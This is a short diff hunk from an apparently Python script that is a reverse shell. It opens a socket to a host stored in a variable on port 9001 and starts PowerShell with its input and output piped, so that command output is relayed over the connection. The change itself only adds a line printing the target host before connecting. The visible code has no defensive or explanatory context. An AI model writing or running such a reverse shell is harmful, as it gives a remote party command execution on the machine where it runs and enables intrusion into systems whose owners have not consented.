@@ -12,6 +12,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print(_)
 s.connect((_,9001))
 
 p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
